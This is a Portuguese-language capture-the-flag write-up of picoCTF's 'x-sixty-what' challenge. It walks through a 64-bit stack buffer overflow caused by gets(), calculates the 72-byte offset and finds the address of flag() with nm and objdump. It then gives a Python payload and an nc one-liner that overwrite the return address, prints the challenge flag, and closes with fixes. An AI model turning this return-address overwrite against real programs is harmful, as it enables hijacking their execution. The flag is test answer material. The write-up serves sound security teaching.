# x-sixty-what

## Descrição do Desafio

**Plataforma:** [picoCTF — x-sixty-what](https://learn.cylabacademy.org/library/319)  
**Autor da WriteUp:** Marcelo Agrico Guedes  
**Edição:** picoCTF 2022  
**Categoria:** Binary Exploitation  
**Vulnerabilidade:** Stack Buffer Overflow / Return Address Overwrite

O desafio apresenta um programa escrito em C que recebe uma string do usuário por meio da função `gets()`.

O objetivo é explorar uma vulnerabilidade de *Stack Buffer Overflow* em um executável de 64 bits, sobrescrevendo o endereço de retorno de uma função para redirecionar a execução até `flag()`, responsável por exibir a flag.

## Arquivos

* `vuln.c` — código-fonte disponibilizado pelo desafio.
* `vuln` — executável Linux de 64 bits fornecido pelo picoCTF.
* Instância oficial do picoCTF — host e porta informados ao iniciar o desafio.

Os arquivos originais devem ser obtidos na plataforma oficial e não são incluídos neste repositório.

## Passo a Passo da Solução

### 1. Análise do arquivo fornecido

Ao analisar o código-fonte `vuln.c`, identificamos a seguinte função:

```c
#define BUFFSIZE 64

void vuln() {
    char buf[BUFFSIZE];
    gets(buf);
}
```

O programa reserva um buffer de **64 bytes** na stack e utiliza a função `gets()` para receber a entrada do usuário.

O problema é que `gets()` não verifica o tamanho dos dados recebidos. Dessa forma, uma entrada maior que a capacidade do buffer pode sobrescrever regiões adjacentes da stack.

Também encontramos a função `flag()`:

```c
void flag() {
    char buf[FLAGSIZE];
    FILE *f = fopen("flag.txt","r");

    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(buf,FLAGSIZE,f);
    printf(buf);
}
```

Essa função realiza a leitura do arquivo `flag.txt` e apresenta seu conteúdo.

Entretanto, ela não é chamada diretamente pelo fluxo normal do programa. Para executá-la, precisamos modificar o endereço de retorno armazenado na stack.

### 2. Identificação da vulnerabilidade

Em programas de 64 bits, os endereços de memória possuem 8 bytes. Quando uma função é chamada, o endereço para o qual a execução deverá retornar fica armazenado na stack.

No executável analisado, a disposição relevante da memória é:

```text
+------------------------+
| Buffer: 64 bytes       |
+------------------------+
| RBP salvo: 8 bytes     |
+------------------------+
| Endereço de retorno    |
+------------------------+
```

Portanto, o deslocamento entre o início do buffer e o endereço de retorno é:

```text
64 + 8 = 72 bytes
```

Isso significa que, após preencher 72 bytes, os próximos 8 bytes enviados poderão sobrescrever o endereço de retorno da função `vuln()`.

Como nosso objetivo é executar `flag()`, precisamos descobrir o endereço dessa função no binário.

### 3. Localização da função flag()

Para identificar o endereço da função, utilizamos o comando:

```bash
nm vuln | grep ' flag$'
```

No executável fornecido, o endereço encontrado foi:

```text
0000000000401236 T flag
```

Também podemos verificar as instruções da função por meio do `objdump`:

```bash
objdump -d -M intel vuln
```

O início da função apresenta as seguintes instruções:

```text
401236: endbr64
40123a: push rbp
40123b: mov rbp, rsp
40123e: sub rsp, 0x50
```

O endereço inicial de `flag()` é `0x401236`. Entretanto, utilizamos o endereço **`0x40123b`**, que corresponde à instrução `mov rbp, rsp`.

Essa escolha permite iniciar a execução após o `push rbp`, evitando um desalinhamento da stack que poderia causar problemas durante a execução da função.

### 4. Exploit

Com o deslocamento e o endereço identificados, podemos construir o payload.

A entrada será composta por:

* **64 bytes** para preencher o buffer.
* **8 bytes** para sobrescrever o valor salvo de `RBP`.
* **8 bytes** contendo o novo endereço de retorno.

Utilizamos o seguinte código em Python:

```python
import struct

offset = 72
endereco = 0x40123b

payload = b"A" * offset
payload += struct.pack("<Q", endereco)

print(payload)
```

O comando `struct.pack("<Q", endereco)` converte o endereço para 8 bytes no formato *little-endian*, utilizado pela arquitetura x86-64.

Para enviar o payload diretamente à instância oficial, executamos:

```bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*72 + struct.pack("<Q", 0x40123b) + b"\n")' | nc chatelaine.cylabacademy.net 39766
```

O endereço e a porta da instância podem variar entre sessões.

O programa recebe a entrada por meio de `gets()`, permitindo sobrescrever o endereço de retorno da função `vuln()`.

Quando a função termina, o programa utiliza o endereço inserido no payload, redirecionando a execução para o código de `flag()`.

### 5. Resultado da execução

Após enviar o payload à instância oficial, obtivemos a seguinte flag:

```text
academy{b1663r_15_b3773r_2bd92d8c}
```

O resultado confirmou que conseguimos modificar o fluxo de execução do programa e alcançar a função responsável por imprimir a flag.

Diferentemente dos desafios anteriores, que exploravam vulnerabilidades na heap, esse desafio utiliza um buffer localizado na stack para modificar o endereço de retorno de uma função.

### 6. Correção e prevenção

A principal vulnerabilidade está no uso da função `gets()`, que permite a leitura de dados sem verificar os limites do buffer.

Uma maneira de evitar esse problema é substituí-la por `fgets()`, informando o tamanho máximo permitido:

```c
void vuln() {
    char buf[BUFFSIZE];
    fgets(buf, sizeof(buf), stdin);
}
```

Dessa forma, a leitura respeita o tamanho reservado para o buffer.

Além disso, mecanismos como *Stack Canaries*, ASLR e PIE podem dificultar a exploração de vulnerabilidades desse tipo.

O uso de funções que verificam os limites da memória é essencial para evitar escritas fora das regiões alocadas.

## Flag

`academy{b1663r_15_b3773r_2bd92d8c}`

## Autor da WriteUp

* Criado pela equipe **HawkSec Team**, em nome de **Marcelo Agrico Guedes**.

*Referências de estudo: [desafio oficial](https://learn.cylabacademy.org/library/319).*
